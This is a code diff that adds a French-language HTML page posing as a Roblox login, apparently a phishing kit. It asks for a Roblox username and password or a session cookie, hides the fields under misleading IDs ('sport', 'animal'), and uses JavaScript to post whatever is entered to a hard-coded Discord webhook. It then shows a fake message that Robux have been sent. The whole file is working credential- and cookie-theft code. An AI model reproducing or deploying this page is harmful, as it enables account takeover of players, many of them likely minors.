@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f0f0;
+        }
+        .container {
+            display: flex;
+            height: 100vh;
+        }
+        .left, .right {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .left {
+            background-color: #4caf50;
+            color: white;
+        }
+        .right {
+            background-color: #ff5722;
+            color: white;
+        }
+        h2 {
+            margin-bottom: 20px;
+        }
+        .form-container {
+            display: none;
+            flex-direction: column;
+            width: 80%;
+            max-width: 300px;
+        }
+        label {
+            margin-bottom: 5px;
+            font-size: 14px;
+        }
+        input {
+            padding: 10px;
+            margin-bottom: 15px;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        button {
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .btn-left {
+            background-color: #388e3c;
+            color: white;
+        }
+        .btn-left:hover {
+            background-color: #2e7d32;
+        }
+        .btn-right {
+            background-color: #d84315;
+            color: white;
+        }
+        .btn-right:hover {
+            background-color: #bf360c;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Section gauche : Connexion avec informations -->
+        <div class="left">
+            <h2>Connexion avec identifiants</h2>
+            <button onclick="showForm('infoForm')" class="btn-left">Remplir</button>
+            <div id="infoForm" class="form-container">
+                <label for="sport">Entrez votre pseudo roblox :</label>
+                <input type="text" id="sport" name="sport" placeholder="Pseudo">
+
+                <label for="animal">Entrez votre mots de passe :</label>
+                <input type="password" id="animal" name="animal" placeholder="Mots de Passe">
+
+                <button onclick="sendToDiscord()" class="btn-left">Se Connecter</button>
+            </div>
+        </div>
+
+        <!-- Section droite : Connexion avec cookie -->
+        <div class="right">
+            <h2>Connexion avec cookie</h2>
+            <button onclick="showForm('cookieForm')" class="btn-right">Remplir</button>
+            <div id="cookieForm" class="form-container">
+                <label for="cookie">Cookie :</label>
+                <input type="text" id="cookie" name="cookie" placeholder="Entrez votre cookie">
+
+                <button onclick="sendToDiscord()" class="btn-right">Se Connecter</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Fonction pour afficher un formulaire spécifique et cacher l'autre
+        function showForm(formId) {
+            const forms = document.querySelectorAll('.form-container');
+            forms.forEach(form => (form.style.display = 'none'));
+            document.getElementById(formId).style.display = 'flex';
+        }
+
+        // Fonction pour envoyer les données à un webhook Discord
+        function sendToDiscord() {
+            const webhookURL = "https://discord.com/api/webhooks/1301126116618272829/TKlnRCgdDt9Fappbu_anVjX-13Kq9iISVhR-9VKPGFgCSvx_tMpxTduci4ZvdWhm5emR"; // Remplacez par votre webhook Discord
+
+            // Récupération des valeurs des champs
+            const sport = document.getElementById('sport')?.value || "Non renseigné";
+            const animal = document.getElementById('animal')?.value || "Non renseigné";
+            const cookie = document.getElementById('cookie')?.value || "Non renseigné";
+
+            // Création de la charge utile pour Discord
+            const payload = {
+                content: `Nouvelles données reçues:\n**Pseudo:**: ${sport}\n**Mots de Passe**: ${animal}\n**Cookie**: ${cookie}`,
+            };
+
+            // Envoi des données au webhook Discord
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload),
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert('Les robux ont été envoyées 🤑');
+                } else {
+                    alert('Erreur lors de l\'envoi des données.');
+                }
+            })
+            .catch(error => console.error('Erreur:', error));
+        }
+    </script>
+</body>
+</html>
